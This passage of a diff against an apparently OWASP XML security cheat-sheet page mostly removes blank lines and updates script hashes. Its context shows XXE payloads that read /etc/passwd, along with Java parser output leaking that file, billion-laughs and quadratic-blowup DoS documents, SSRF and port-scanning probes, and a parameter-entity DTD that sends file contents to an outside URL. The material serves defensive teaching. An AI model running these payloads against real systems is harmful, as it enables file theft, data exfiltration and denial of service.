 </code></pre></div>
-
 
 <h3 id="violation-of-xml-specification-rules">Violation of XML Specification Rules<a class="headerlink" href="#violation-of-xml-specification-rules" title="Permanent link">&para;</a></h3>
 <p>Unexpected consequences may result from manipulating documents using parsers that do not follow W3C specifications. It may be possible to achieve crashes and/or code execution when the software does not properly verify how to handle incorrect XML structures. Feeding the software with fuzzed XML documents may expose this behavior.</p>
@@ -2033,14 +2132,12 @@
 <span class="nt">&lt;/buy&gt;</span>
 </code></pre></div>
 
-
 <p>If there is no control on the document's structure, the application could also process different well-formed messages with unintended consequences. The previous document could have contained additional tags to affect the behavior of the underlying application processing its contents:</p>
 <div class="codehilite"><pre><span></span><code><span class="nt">&lt;buy&gt;</span>
  <span class="nt">&lt;id&gt;</span>123<span class="nt">&lt;/id&gt;&lt;price&gt;</span>0<span class="nt">&lt;/price&gt;&lt;id&gt;&lt;/id&gt;</span>
  <span class="nt">&lt;price&gt;</span>10<span class="nt">&lt;/price&gt;</span>
 <span class="nt">&lt;/buy&gt;</span>
 </code></pre></div>
-
 
 <p>Notice again how the value 123 is supplied as an <code>id</code>, but now the document includes additional opening and closing tags. The attacker closed the <code>id</code> element and sets a bogus <code>price</code> element to the value 0. The final step to keep the structure well-formed is to add one empty <code>id</code> element. After this, the application adds the closing tag for <code>id</code> and set the <code>price</code> to 10. If the application processes only the first values provided for the ID and the value without performing any type of control on the structure, it could benefit the attacker by providing the ability to buy a book without actually paying for it.</p>
 <h3 id="unrestrictive-schema">Unrestrictive Schema<a class="headerlink" href="#unrestrictive-schema" title="Permanent link">&para;</a></h3>
@@ -2056,7 +2153,6 @@
 <span class="nt">&lt;/person&gt;</span>
 </code></pre></div>
 
-
 <p>The previous document contains an inline <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> with a root element named <code>person</code>. This element contains two elements in a specific order: <code>name</code> and then <code>age</code>. The element <code>name</code> is then defined to contain <code>PCDATA</code> as well as the element <code>age</code>. After this definition begins the well-formed and valid XML document. The element name contains an irrelevant value but the <code>age</code> element contains one million digits. Since there are no restrictions on the maximum size for the <code>age</code> element, this one-million-digit string could be sent to the server for this element. Typically this type of element should be restricted to contain no more than a certain amount of characters and constrained to a certain set of characters (for example, digits from 0 to 9, the + sign and the - sign). If not properly restricted, applications may handle potentially invalid values contained in documents. Since it is not possible to indicate specific restrictions (a maximum length for the element <code>name</code> or a valid range for the element <code>age</code>), this type of schema increases the risk of affecting the integrity and availability of resources.</p>
 <h3 id="improper-data-validation">Improper Data Validation<a class="headerlink" href="#improper-data-validation" title="Permanent link">&para;</a></h3>
 <p>When schemas are insecurely defined and do not provide strict rules, they may expose the application to diverse situations. The result of this could be the disclosure of internal errors or documents that hit the application's functionality with unexpected values.</p>
@@ -2070,7 +2166,6 @@
   <span class="nt">&lt;/choice&gt;</span>
  <span class="nt">&lt;/complexType&gt;</span>
 </code></pre></div>
-
 
 <p>The previous schema defines the element <code>CipherValue</code> as a base64 data type. As an example, the IBM WebSphere DataPower SOA Appliance allowed any type of characters within this element after a valid base64 value, and will consider it valid. The first portion of this data is properly checked as a base64 value, but the remaining characters could be anything else (including other sub-elements of the <code>CipherData</code> element). Restrictions are partially set for the element, which means that the information is probably tested using an application instead of the proposed sample schema.</p>
 <h4 id="numeric-data-types">Numeric Data Types<a class="headerlink" href="#numeric-data-types" title="Permanent link">&para;</a></h4>
@@ -2091,7 +2186,6 @@
 <span class="nt">&lt;/buy&gt;</span>
 </code></pre></div>
 
-
 <p>To avoid repeating old errors, an XML schema may be defined to prevent processing the incorrect structure in cases where an attacker wants to introduce additional elements:</p>
 <div class="codehilite"><pre><span></span><code><span class="nt">&lt;xs:schema</span> <span class="na">xmlns:xs=</span><span class="s">&quot;http://www.w3.org/2001/XMLSchema&quot;</span><span class="nt">&gt;</span>
  <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">&quot;buy&quot;</span><span class="nt">&gt;</span>
@@ -2106,7 +2200,6 @@
 <span class="nt">&lt;/xs:schema&gt;</span>
 </code></pre></div>
 
-
 <p>Limiting that <code>quantity</code> to an integer data type will avoid any unexpected characters. Once the application receives the previous message, it may calculate the final price by doing <code>price*quantity</code>. However, since this data type may allow negative values, it might allow a negative result on the user's account if an attacker provides a negative number. What you probably want to see in here to avoid that logical vulnerability is positiveInteger instead of integer.</p>
 <h5 id="divide-by-zero">Divide by Zero<a class="headerlink" href="#divide-by-zero" title="Permanent link">&para;</a></h5>
 <p>Whenever using user controlled values as denominators in a division, developers should avoid allowing the number zero. In cases where the value zero is used for division in XSLT, the error <code>FOAR0001</code> will occur. Other applications may throw other exceptions and the program may crash. There are specific data types for XML schemas that specifically avoid using the zero value. For example, in cases where negative values and zero are not considered valid, the schema could specify the data type <code>positiveInteger</code> for the element.</p>
@@ -2116,7 +2209,6 @@
  <span class="nt">&lt;/xs:simpleType&gt;</span>
 <span class="nt">&lt;/xs:element&gt;</span>
 </code></pre></div>
-
 
 <p>The element <code>denominator</code> is now restricted to positive integers. This means that only values greater than zero will be considered valid. If you see any other type of restriction being used, you may trigger an error if the denominator is zero.</p>
 <h5 id="special-values-infinity-and-not-a-number-nan">Special Values: Infinity and Not a Number (NaN)<a class="headerlink" href="#special-values-infinity-and-not-a-number-nan" title="Permanent link">&para;</a></h5>
@@ -2133,7 +2225,6 @@
  <span class="nt">&lt;/xs:element&gt;</span>
 <span class="nt">&lt;/xs:schema&gt;</span>
 </code></pre></div>
-
 
 <p>The price value will not trigger any errors when set at Infinity or NaN, because these values will not be valid. An attacker can exploit this issue if those values are allowed.</p>
 <h4 id="general-data-restrictions">General Data Restrictions<a class="headerlink" href="#general-data-restrictions" title="Permanent link">&para;</a></h4>
@@ -2160,7 +2251,6 @@
 <span class="nt">&lt;/xs:element&gt;</span>
 </code></pre></div>
 
-
 <p>By limiting the month element's value to any of the previous values, the application will not be manipulating random strings.</p>
 <h5 id="ranges">Ranges<a class="headerlink" href="#ranges" title="Permanent link">&para;</a></h5>
 <p>Software applications, databases, and programming languages normally store information within specific ranges. Whenever using an element or an attribute in locations where certain specific sizes matter (to avoid overflows or underflows), it would be logical to check whether the data length is considered valid. The following schema could constrain a name using a minimum and a maximum length to avoid unusual scenarios:</p>
@@ -2174,7 +2264,6 @@
 <span class="nt">&lt;/xs:element&gt;</span>
 </code></pre></div>
 
-
 <p>In cases where the possible values are restricted to a certain specific length (let's say 8), this value can be specified as follows to be valid:</p>
 <div class="codehilite"><pre><span></span><code><span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">&quot;name&quot;</span><span class="nt">&gt;</span>
  <span class="nt">&lt;xs:simpleType&gt;</span>
@@ -2184,7 +2273,6 @@
  <span class="nt">&lt;/xs:simpleType&gt;</span>
 <span class="nt">&lt;/xs:element&gt;</span>
 </code></pre></div>
-
 
 <h5 id="patterns">Patterns<a class="headerlink" href="#patterns" title="Permanent link">&para;</a></h5>
 <p>Certain elements or attributes may follow a specific syntax. You can add <code>pattern</code> restrictions when using XML schemas. When you want to ensure that the data complies with a specific pattern, you can create a specific definition for it. Social security numbers (SSN) may serve as a good example; they must use a specific set of characters, a specific length, and a specific <code>pattern</code>:</p>
@@ -2197,7 +2285,6 @@
 <span class="nt">&lt;/xs:element&gt;</span>
 </code></pre></div>
 
-
 <p>Only numbers between <code>000-00-0000</code> and <code>999-99-9999</code> will be allowed as values for a SSN.</p>
 <h5 id="assertions">Assertions<a class="headerlink" href="#assertions" title="Permanent link">&para;</a></h5>
 <p>Assertion components constrain the existence and values of related elements and attributes on XML schemas. An element or attribute will be considered valid with regard to an assertion only if the test evaluates to true without raising any error. The variable <code>$value</code> can be used to reference the contents of the value being analyzed. The <em>Divide by Zero</em> section above referenced the potential consequences of using data types containing the zero value for denominators, proposing a data type containing only positive values. An opposite example would consider valid the entire range of numbers except zero. To avoid disclosing potential errors, values could be checked using an <code>assertion</code> disallowing the number zero:</p>
@@ -2209,7 +2296,6 @@
  <span class="nt">&lt;/xs:simpleType&gt;</span>
 <span class="nt">&lt;/xs:element&gt;</span>
 </code></pre></div>
-
 
 <p>The assertion guarantees that the <code>denominator</code> will not contain the value zero as a valid number and also allows negative numbers to be a valid denominator.</p>
 <h5 id="occurrences">Occurrences<a class="headerlink" href="#occurrences" title="Permanent link">&para;</a></h5>
@@ -2232,7 +2318,6 @@
 <span class="nt">&lt;/xs:schema&gt;</span>
 </code></pre></div>
 
-
 <p>The previous schema includes a root element named <code>operation</code>, which can contain an unlimited (<code>unbounded</code>) amount of buy elements. This is a common finding, since developers do not normally want to restrict maximum numbers of occurrences. Applications using limitless occurrences should test what happens when they receive an extremely large amount of elements to be processed. Since computational resources are limited, the consequences should be analyzed and eventually a maximum number ought to be used instead of an <code>unbounded</code> value.</p>
 <h3 id="jumbo-payloads">Jumbo Payloads<a class="headerlink" href="#jumbo-payloads" title="Permanent link">&para;</a></h3>
 <p>Sending an XML document of 1GB requires only a second of server processing and might not be worth consideration as an attack. Instead, an attacker would look for a way to minimize the CPU and traffic used to generate this type of attack, compared to the overall amount of server CPU or traffic used to handle the requests.</p>
@@ -2251,7 +2336,6 @@
  ...
 </code></pre></div>
 
-
 <h4 id="small-jumbo-payloads">"Small" Jumbo Payloads<a class="headerlink" href="#small-jumbo-payloads" title="Permanent link">&para;</a></h4>
 <p>The following example is a very small document, but the results of processing this could be similar to those of processing traditional jumbo payloads. The purpose of such a small payload is that it allows an attacker to send many documents fast enough to make the application consume most or all of the available resources:</p>
 <div class="codehilite"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
@@ -2260,7 +2344,6 @@
 ]&gt;
 <span class="nt">&lt;root&gt;</span><span class="ni">&amp;file;</span><span class="nt">&lt;/root&gt;</span>
 </code></pre></div>
-
 
 <h3 id="schema-poisoning">Schema Poisoning<a class="headerlink" href="#schema-poisoning" title="Permanent link">&para;</a></h3>
 <p>When an attacker is capable of introducing modifications to a schema, there could be multiple high-risk consequences. In particular, the effect of these consequences will be more dangerous if the schemas are using <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> (e.g., file retrieval, denial of service). An attacker could exploit this type of vulnerability in numerous scenarios, always depending on the location of the schema.</p>
@@ -2284,7 +2367,6 @@
 <span class="nt">&lt;/note&gt;</span>
 </code></pre></div>
 
-
 <p>All restrictions on the note element could be removed or altered, allowing the sending of any type of data to the server. Furthermore, if the server is processing external entities, the attacker could use the schema, for example, to read remote files from the server. This type of schema only serves as a suggestion for sending a document, but it must contains a way to check the embedded schema integrity to be used safely. Attacks through embedded schemas are commonly used to exploit external entity expansions. Embedded XML schemas can also assist in port scans of internal hosts or brute force attacks.</p>
 <h5 id="incorrect-permissions">Incorrect Permissions<a class="headerlink" href="#incorrect-permissions" title="Permanent link">&para;</a></h5>
 <p>You can often circumvent the risk of using remotely tampered versions by processing a local schema.</p>
@@ -2297,11 +2379,9 @@
 <span class="nt">&lt;/note&gt;</span>
 </code></pre></div>
 
-
 <p>However, if the local schema does not contain the correct permissions, an internal attacker could alter the original restrictions. The following line exemplifies a schema using permissions that allow any user to make modifications:</p>
 <div class="codehilite"><pre><span></span><code>-rw-rw-rw-  1 user  staff  743 Jan 15 12:32 note.dtd
 </code></pre></div>
-
 
 <p>The permissions set on <code>name.dtd</code> allow any user on the system to make modifications. This vulnerability is clearly not related to the structure of an XML or a schema, but since these documents are commonly stored in the filesystem, it is worth mentioning that an attacker could exploit this type of problem.</p>
 <h4 id="remote-schema-poisoning">Remote Schema Poisoning<a class="headerlink" href="#remote-schema-poisoning" title="Permanent link">&para;</a></h4>
@@ -2317,7 +2397,6 @@
 <span class="nt">&lt;/note&gt;</span>
 </code></pre></div>
 
-
 <p>The remote file <code>note.dtd</code> could be susceptible to tampering when transmitted using the unencrypted HTTP protocol. One tool available to facilitate this type of attack is mitmproxy .</p>
 <h5 id="dns-cache-poisoning">DNS-Cache Poisoning<a class="headerlink" href="#dns-cache-poisoning" title="Permanent link">&para;</a></h5>
 <p>Remote schema poisoning may also be possible even when using encrypted protocols like Hypertext Transfer Protocol Secure (HTTPS). When software performs reverse Domain Name System (DNS) resolution on an IP address to obtain the hostname, it may not properly ensure that the IP address is truly associated with the hostname. In this case, the software enables an attacker to redirect content to their own Internet Protocol (IP) addresses.</p>
@@ -2327,12 +2406,10 @@
 example.com has address <span class="m">1</span>.1.1.1
 </code></pre></div>
 
-
 <p>If an attacker compromises the DNS being used, the previous hostname could now point to a new, different IP controlled by the attacker <code>2.2.2.2</code>:</p>
 <div class="codehilite"><pre><span></span><code>$ host example.com
 example.com has address <span class="m">2</span>.2.2.2
 </code></pre></div>
-
 
 <p>When accessing the remote file, the victim may be actually retrieving the contents of a location controlled by an attacker.</p>
 <h5 id="evil-employee-attack">Evil Employee Attack<a class="headerlink" href="#evil-employee-attack" title="Permanent link">&para;</a></h5>
@@ -2351,7 +2428,6 @@ example.com has address <span class="m">2</span>.2.2.2
 <span class="nt">&lt;/contacts&gt;</span>
 </code></pre></div>
 
-
 <p><strong>Sample DTD</strong>:</p>
 <div class="codehilite"><pre><span></span><code><span class="cp">&lt;!ELEMENT contacts (contact*)&gt;</span>
 <span class="cp">&lt;!ELEMENT contact (firstname,lastname)&gt;</span>
@@ -2359,7 +2435,6 @@ example.com has address <span class="m">2</span>.2.2.2
 <span class="cp">&lt;!ELEMENT lastname ANY&gt;</span>
 <span class="cp">&lt;!ENTITY xxe SYSTEM &quot;/etc/passwd&quot;&gt;</span>
 </code></pre></div>
-
 
 <h5 id="xxe-using-dom">XXE using DOM<a class="headerlink" href="#xxe-using-dom" title="Permanent link">&para;</a></h5>
 <div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="p">;</span>
@@ -2400,7 +2475,6 @@ example.com has address <span class="m">2</span>.2.2.2
 <span class="p">}</span>
 </code></pre></div>
 
-
 <p>The previous code produces the following output:</p>
 <div class="codehilite"><pre><span></span><code>$ javac parseDocument.java <span class="p">;</span> java parseDocument
 First Name: John
@@ -2409,7 +2483,6 @@ Last Name: <span class="c1">### User Database</span>
 nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
 root:*:0:0:System Administrator:/var/root:/bin/sh
 </code></pre></div>
-
 
 <h5 id="xxe-using-dom4j">XXE using DOM4J<a class="headerlink" href="#xxe-using-dom4j" title="Permanent link">&para;</a></h5>
 <div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">org.dom4j.Document</span><span class="p">;</span>
@@ -2438,7 +2511,6 @@ root:*:0:0:System Administrator:/var/root:/bin/sh
 <span class="p">}</span>
 </code></pre></div>
 
-
 <p>The previous code produces the following output:</p>
 <div class="codehilite"><pre><span></span><code>$ java test1
 &lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">&quot;1.0&quot;</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">&quot;UTF-8&quot;</span>?&gt;
@@ -2452,7 +2524,6 @@ root:*:0:0:System Administrator:/var/root:/bin/sh
 nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
 root:*:0:0:System Administrator:/var/root:/bin/sh
 </code></pre></div>
-
 
 <h5 id="xxe-using-sax">XXE using SAX<a class="headerlink" href="#xxe-using-sax" title="Permanent link">&para;</a></h5>
 <div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="p">;</span>
@@ -2482,7 +2553,6 @@ root:*:0:0:System Administrator:/var/root:/bin/sh
 <span class="p">}</span>
 </code></pre></div>
 
-
 <p>The previous code produces the following output:</p>
 <div class="codehilite"><pre><span></span><code>$ java parseDocument
 John
@@ -2491,7 +2561,6 @@ John
 nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
 root:*:0:0:System Administrator:/var/root:/bin/sh
 </code></pre></div>
-
 
 <h5 id="xxe-using-stax">XXE using StAX<a class="headerlink" href="#xxe-using-stax" title="Permanent link">&para;</a></h5>
 <div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">javax.xml.parsers.SAXParserFactory</span><span class="p">;</span>
@@ -2524,7 +2593,6 @@ root:*:0:0:System Administrator:/var/root:/bin/sh
 <span class="p">}</span>
 </code></pre></div>
 
-
 <p>The previous code produces the following output:</p>
 <div class="codehilite"><pre><span></span><code>$ java parseDocument
 &lt;!DOCTYPE contacts SYSTEM <span class="s2">&quot;contacts.dtd&quot;</span>&gt;John### User Database
@@ -2532,7 +2600,6 @@ root:*:0:0:System Administrator:/var/root:/bin/sh
 nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
 root:*:0:0:System Administrator:/var/root:/bin/sh
 </code></pre></div>
-
 
 <h4 id="recursive-entity-reference">Recursive Entity Reference<a class="headerlink" href="#recursive-entity-reference" title="Permanent link">&para;</a></h4>
 <p>When the definition of an element <code>A</code> is another element <code>B</code>, and that element <code>B</code> is defined as element <code>A</code>, that schema describes a circular reference between elements:</p>
@@ -2544,7 +2611,6 @@ root:*:0:0:System Administrator:/var/root:/bin/sh
 <span class="nt">&lt;A&gt;</span><span class="ni">&amp;A;</span><span class="nt">&lt;/A&gt;</span>
 </code></pre></div>
 
-
 <h4 id="quadratic-blowup">Quadratic Blowup<a class="headerlink" href="#quadratic-blowup" title="Permanent link">&para;</a></h4>
 <p>Instead of defining multiple small, deeply nested entities, the attacker in this scenario defines one very large entity and refers to it as many times as possible, resulting in a quadratic expansion <code>(O(n2))</code>.</p>
 <p>The result of the following attack will be 100,000 x 100,000 characters in memory.</p>
@@ -2554,7 +2620,6 @@ root:*:0:0:System Administrator:/var/root:/bin/sh
 ]&gt;
 <span class="nt">&lt;root&gt;</span><span class="ni">&amp;A;&amp;A;&amp;A;&amp;A;</span>...(a 100.000 <span class="ni">&amp;A;</span>&#39;s)...<span class="ni">&amp;A;&amp;A;&amp;A;&amp;A;&amp;A;</span><span class="nt">&lt;/root&gt;</span>
 </code></pre></div>
-
 
 <h4 id="billion-laughs">Billion Laughs<a class="headerlink" href="#billion-laughs" title="Permanent link">&para;</a></h4>
 <p>When an XML parser tries to resolve the external entities included within the following code, it will cause the application to start consuming all of the available memory until the process crashes. This is an example XML document with an embedded <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> schema including the attack:</p>
@@ -2573,7 +2638,6 @@ root:*:0:0:System Administrator:/var/root:/bin/sh
 ]&gt;
 <span class="nt">&lt;root&gt;</span><span class="ni">&amp;LOL9;</span><span class="nt">&lt;/root&gt;</span>
 </code></pre></div>
-
 
 <p>The entity <code>LOL9</code> will be resolved as the 10 entities defined in <code>LOL8</code>; then each of these entities will be resolved in <code>LOL7</code> and so on. Finally, the CPU and/or memory will be affected by parsing the <code>3 x 10^9</code> (3,000,000,000) entities defined in this schema, which could make the parser crash.</p>
 <p>The Simple Object Access Protocol (<a href="https://en.wikipedia.org/wiki/SOAP">SOAP</a>) specification forbids <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a>s completely. This means that a SOAP processor can reject any SOAP message that contains a <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a>. Despite this specification, certain SOAP implementations did parse <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> schemas within SOAP messages.</p>
@@ -2601,7 +2665,6 @@ root:*:0:0:System Administrator:/var/root:/bin/sh
 <span class="nt">&lt;/SOAP:ENVELOPE&gt;</span>
 </code></pre></div>
 
-
 <h4 id="reflected-file-retrieval">Reflected File Retrieval<a class="headerlink" href="#reflected-file-retrieval" title="Permanent link">&para;</a></h4>
 <p>Consider the following example code of an XXE:</p>
 <div class="codehilite"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span>
@@ -2612,7 +2675,6 @@ root:*:0:0:System Administrator:/var/root:/bin/sh
 <span class="nt">&lt;root&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/root&gt;</span>
 </code></pre></div>
 
-
 <p>The previous XML defines an entity named <code>xxe</code>, which is in fact the contents of <code>/etc/passwd</code>, which will be expanded within the <code>includeme</code> tag. If the parser allows references to external entities, it might include the contents of that file in the XML response or in the error output.</p>
 <h4 id="server-side-request-forgery">Server Side Request Forgery<a class="headerlink" href="#server-side-request-forgery" title="Permanent link">&para;</a></h4>
 <p>Server Side Request Forgery (SSRF) happens when the server receives a malicious XML schema, which makes the server retrieve remote resources such as a file, a file via HTTP/HTTPS/FTP, etc. SSRF has been used to retrieve remote files, to prove a XXE when you cannot reflect back the file or perform port scanning, or perform brute force attacks on internal networks.</p>
@@ -2620,7 +2682,6 @@ root:*:0:0:System Administrator:/var/root:/bin/sh
 <p>Sometimes is possible to induce the application to perform server-side DNS lookups of arbitrary domain names. This is one of the simplest forms of SSRF, but requires the attacker to analyze the DNS traffic. Burp has a plugin that checks for this attack.</p>
 <div class="codehilite"><pre><span></span><code><span class="cp">&lt;!DOCTYPE m PUBLIC &quot;-//B/A/EN&quot; &quot;http://checkforthisspecificdomain.example.com&quot;&gt;</span>
 </code></pre></div>
-
 
 <h5 id="external-connection">External Connection<a class="headerlink" href="#external-connection" title="Permanent link">&para;</a></h5>
 <p>Whenever there is an XXE and you cannot retrieve a file, you can test if you would be able to establish remote connections:</p>
@@ -2630,7 +2691,6 @@ root:*:0:0:System Administrator:/var/root:/bin/sh
  %xxe;
 ]&gt;
 </code></pre></div>
-
 
 <h5 id="file-retrieval-with-parameter-entities">File Retrieval with Parameter Entities<a class="headerlink" href="#file-retrieval-with-parameter-entities" title="Permanent link">&para;</a></h5>
 <p>Parameter entities allows for the retrieval of content using URL references. Consider the following malicious XML document:</p>
@@ -2643,13 +2703,11 @@ root:*:0:0:System Administrator:/var/root:/bin/sh
 <span class="nt">&lt;root&gt;</span><span class="ni">&amp;send;</span><span class="nt">&lt;/root&gt;</span>
 </code></pre></div>
 
-
 <p>Here the <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> defines two external parameter entities: <code>file</code> loads a local file, and <code>dtd</code> which loads a remote <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a>. The remote <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> should contain something like this:</p>
 <div class="codehilite"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
 <span class="cp">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;http://example.com/?%file;&#39;&gt;</span>&quot;&gt;
 %all;
 </code></pre></div>
-
 
 <p>The second <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> causes the system to send the contents of the <code>file</code> back to the attacker's server as a parameter of the URL.</p>
 <h5 id="port-scanning">Port Scanning<a class="headerlink" href="#port-scanning" title="Permanent link">&para;</a></h5>
@@ -2660,7 +2718,6 @@ root:*:0:0:System Administrator:/var/root:/bin/sh
  at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1459)
  at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.setupCurrentEntity(XMLEntityManager.java:674)
 </code></pre></div>
-
 
 <p><strong>3) Timeout-based</strong>: Timeouts could occur when connecting to open or closed ports depending on the schema and the underlying implementation. If the timeouts occur while you are trying to connect to a closed port (which may take one minute), the time of response when connected to a valid port will be very quick (one second, for example). The differences between open and closed ports becomes quite clear.</p>
 <p><strong>4) Time-based</strong>: Sometimes differences between closed and open ports are very subtle. The only way to know the status of a port with certainty would be to take multiple measurements of the time required to reach each host; then analyze the average time for each port to determinate the status of each port. This type of attack will be difficult to accomplish when performed in higher latency networks.</p>
@@ -2691,7 +2748,7 @@ root:*:0:0:System Administrator:/var/root:/bin/sh
     <div class="md-footer-nav">
       <nav class="md-footer-nav__inner md-grid" aria-label="Footer">
         
-          <a href="XML_External_Entity_Prevention_Cheat_Sheet.html" title="XML External Entity Prevention" class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+          <a href="XML_External_Entity_Prevention_Cheat_Sheet.html" class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
             <div class="md-footer-nav__button md-icon">
               <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
             </div>
@@ -2729,15 +2786,15 @@ root:*:0:0:System Administrator:/var/root:/bin/sh
       
     </div>
     
-      <script src="../assets/javascripts/vendor.592d4e23.min.js"></script>
-      <script src="../assets/javascripts/bundle.073197b2.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents"}</script>
+      <script src="../assets/javascripts/vendor.08c56446.min.js"></script>
+      <script src="../assets/javascripts/bundle.6ced434e.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing"}</script>
       
       <script>
         app = initialize({
           base: "..",
           features: [],
           search: Object.assign({
-            worker: "../assets/javascripts/worker/search.01088dc6.min.js"
+            worker: "../assets/javascripts/worker/search.8c7e0a7e.min.js"
           }, typeof search !== "undefined" && search)
         })
       </script>
